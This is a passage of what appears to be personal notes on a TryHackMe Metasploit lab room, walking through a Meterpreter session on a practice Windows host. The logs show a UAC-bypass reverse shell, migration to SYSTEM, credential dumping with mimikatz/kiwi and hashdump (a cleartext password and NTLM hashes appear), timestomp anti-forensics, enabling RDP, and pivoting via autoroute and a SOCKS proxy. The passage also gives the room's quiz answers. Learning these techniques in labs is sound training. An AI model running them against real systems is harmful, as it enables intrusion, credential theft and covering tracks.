    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > run
Usage: run <script> [arguments]

Executes a ruby script or Metasploit Post module in the context of the
meterpreter session.  Post modules can take arguments in var=val format.
Example: run post/foo/bar BAZ=abcd

meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:5983
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:c3:1d:8c:26:79
MTU          : 9001
IPv4 Address : 10.10.89.131
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::b498:6fbd:621e:b527
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > run post/windows/gather/checkvm

[*] Checking if the target is a Virtual Machine ...
[+] This is a Xen Virtual Machine

meterpreter > creds_all
[!] Not running as SYSTEM, execution may fail
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.89.131 - Collecting local exploits for x86/windows...
[*] 10.10.89.131 - 174 exploit checks are being tried...
[+] 10.10.89.131 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.89.131 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.89.131 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.89.131 - Valid modules for session 3:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 11  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 12  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 13  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 14  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 15  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 17  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 18  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 19  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 20  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 21  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 22  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 23  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 24  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 25  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 26  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 27  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 28  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 29  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.


meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /home/witty/.msf4/loot/20230228165328_default_10.10.89.131_host.windows.cle_296360.txt

meterpreter > run exploit/windows/local/bypassuac_eventvwr

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.10.89.131
[*] Cleaning up registry keys ...
[*] Meterpreter session 4 opened (10.8.19.103:4444 -> 10.10.89.131:49438) at 2023-02-28 16:55:54 -0500
[*] Session 4 created in the background.
meterpreter > 
Background session 3? [y/N]  
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
                                                             131:49249 (10.10.89.131)
  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
                                                             131:49422 (10.10.89.131)
  3         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
                                                             131:49409 (10.10.89.131)
  4         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
                                                             131:49438 (10.10.89.131)

msf6 exploit(windows/http/icecast_header) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > creds_all
[-] The "creds_all" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.

meterpreter > getuid
Server username: Dark-PC\Dark


meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2632 to 1384...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                      NTLM                    SHA1
--------  ------   --                      ----                    ----
Dark      Dark-PC  e52cac67419a9a22ecb083  7c4fe5eada682714a036e3  0d082c4b4f2aeafb67fd0ea
                   69099ed302              9378362bab              568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
[-] Error running command hashdump: NoMethodError undefined method `id' for nil:NilClass

meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/witty/Downloads/pNRgadAt.html
[*] Streaming...

^C[-] Error running command screenshare: Interrupt 
meterpreter > record_mic
[*] Starting...
[-] stdapi_webcam_audio_record: Operation failed: The system cannot find the file specified.

meterpreter > timestomp ?

Usage: timestomp <file(s)> OPTIONS

OPTIONS:

    -a   Set the "last accessed" time of the file
    -b   Set the MACE timestamps so that EnCase shows blanks
    -c   Set the "creation" time of the file
    -e   Set the "mft entry modified" time of the file
    -f   Set the MACE of attributes equal to the supplied file
    -h   Help banner
    -m   Set the "last written" time of the file
    -r   Set the MACE timestamps recursively on a directory
    -v   Display the UTC MACE values of the file
    -z   Set all four attributes (MACE) of the file

meterpreter > cd Dark
meterpreter > dir
Listing: C:\Users\Dark
======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  AppData
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Application Data
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Contacts
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Cookies
040555/r-xr-xr-x  0       dir   2019-11-12 18:04:09 -0500  Desktop
040555/r-xr-xr-x  4096    dir   2019-11-12 17:48:51 -0500  Documents
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Downloads
040555/r-xr-xr-x  4096    dir   2019-11-12 17:48:53 -0500  Favorites
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Links
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Local Settings
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Music
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  My Documents
100666/rw-rw-rw-  524288  fil   2023-02-28 16:39:08 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2019-11-12 18:28:00 -0500  NTUSER.DAT{016888bd-6c6f-11de-8
                                                           d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2019-11-12 18:28:00 -0500  NTUSER.DAT{016888bd-6c6f-11de-8
                                                           d1d-001e0bcde3ec}.TMContainer00
                                                           000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2019-11-12 18:28:00 -0500  NTUSER.DAT{016888bd-6c6f-11de-8
                                                           d1d-001e0bcde3ec}.TMContainer00
                                                           000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  NetHood
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Pictures
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  PrintHood
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Recent
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Saved Games
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Searches
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  SendTo
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Start Menu
040777/rwxrwxrwx  0       dir   2019-11-12 17:48:31 -0500  Templates
040555/r-xr-xr-x  0       dir   2019-11-12 17:48:51 -0500  Videos
100666/rw-rw-rw-  262144  fil   2023-02-28 16:39:08 -0500  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2019-11-12 17:48:31 -0500  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2019-11-12 17:48:31 -0500  ntuser.ini

meterpreter > cd Downloads
meterpreter > upload creds.txt
[*] uploading  : /home/witty/Downloads/creds.txt -> creds.txt
[*] Uploaded 21.00 B of 21.00 B (100.0%): /home/witty/Downloads/creds.txt -> creds.txt
[*] uploaded   : /home/witty/Downloads/creds.txt -> creds.txt

meterpreter > timestomp -m "04/04/1998 12:12:12" "C:\Users\Dark\Downloads\creds.txt"
[*] Setting specific MACE attributes on C:\Users\Dark\Downloads\creds.txt
meterpreter > dir
Listing: C:\Users\Dark\Downloads
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  21    fil   1998-04-04 13:12:12 -0500  creds.txt
100666/rw-rw-rw-  282   fil   2019-11-12 17:48:51 -0500  desktop.ini

┌──(witty㉿kali)-[~/Downloads]
└─$ cat creds.txt 
pasta:pastaisdynamic

meterpreter > wifi_list

[-] No wireless profiles found on the target.

meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/witty/.msf4/loot/20230228172649_default_10.10.89.131_host.windows.cle_645917.txt

meterpreter > shell
Process 3444 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Dark\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is ECF2-DF42

 Directory of C:\Users\Dark\Downloads

02/28/2023  04:12 PM    <DIR>          .
02/28/2023  04:12 PM    <DIR>          ..
04/04/1998  12:12 PM                21 creds.txt
               1 File(s)             21 bytes
               2 Dir(s)  20,011,905,024 bytes free

C:\Users\Dark\Downloads>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is ECF2-DF42

 Directory of C:\Users\Dark\Downloads

02/28/2023  04:12 PM    <DIR>          .
02/28/2023  04:12 PM    <DIR>          ..
04/04/1998  12:12 PM                21 creds.txt
11/12/2019  04:48 PM               282 desktop.ini
               2 File(s)            303 bytes
               2 Dir(s)  20,011,905,024 bytes free


```

![[Pasted image 20230228170216.png]]

First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`. What's the name of the spool service?

I've included this example as the spool service is traditionally very stable and restarts pretty quickly in the case that we crash it.

*spoolsv.exe*

Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

Like birds, we've gotta migrate.

*migrate*

Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

*getuid*

How about finding more information out about the system itself?

*sysinfo*

This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 

The new version of mimikatz is referred to as 'kiwi' in metasploit.

*load kiwi*

Let's go ahead and figure out the privileges of our current user, what command do we run?

*getprivs*

What command do we run to transfer files to our victim computer?

*upload*

How about if we want to run a Metasploit module?

Similar to how we ran the exploit previously

*run*

A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

There are two forms here, I'm looking for the option including the character 'p' and is otherwise a Windows command.

*ipconfig*

Let's go ahead and run a few post modules from Metasploit. First, let's run the command run `post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

 Completed

Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room [Ice](https://tryhackme.com/room/ice).

 Completed

Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

 Completed

One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? 

*shell*


### Makin' Cisco Proud

Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.

Answer the questions below

```
C:\Users\Dark\Downloads>^Z
Background channel 6? [y/N]  y
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module

meterpreter > run autoroute -s 172.18.1.0 -n 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.18.1.0/255.255.255.0...
[-] Could not execute autoroute: ArgumentError Invalid :session, expected Session object got Msf::Sessions::Meterpreter_x86_Win

meterpreter > 
Background session 4? [y/N]  
msf6 exploit(windows/http/icecast_header) > search server/socks5
[-] No results from search

uhmm let's update it

┌──(root㉿kali)-[/home/witty/Downloads]
└─# apt update; apt install metasploit-framework

msf6 exploit(windows/http/icecast_header) > exit
[*] You have active sessions open, to exit anyway type "exit -y"
msf6 exploit(windows/http/icecast_header) > exit -y

I see the problem it was updated  to auxiliary/server/socks_proxy 

msf6 > search socks

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal

msf6 > use 0
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network inter
                                       face to listen on. This must be
                                        an address on the local machin
                                       e or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accep
                                       ted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 list
                                        ener
   USERNAME                   no        Proxy username for SOCKS5 list
                                        ener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

┌──(kali㉿kali)-[/home/witty/Downloads]
└─$ tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050

uncomment dynamic_chain  with and comment others # also uncomment proxy_dns

msf6 auxiliary(server/socks_proxy) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server

┌──(kali㉿kali)-[/home/witty/Downloads]
└─$ proxychains -q nmap -n -sT -Pn -p 135 -sV 10.10.89.131 --min-rate 5000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 18:00 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 100.00% done; ETC: 18:00 (0:00:00 remaining)
Nmap scan report for 10.10.89.131
Host is up (1.1s latency).

PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the `-n` flag in your answer.

*run autoroute -s 172.18.1.0 -n 255.255.255.0*

Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command `search server/socks5`. What is the full path to the socks5 auxiliary module?

*auxiliary/server/socks5*

Once we've started a socks server we can modify our _/etc/proxychains.conf_ file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?

*proxychains*



[[Oh My WebServer]]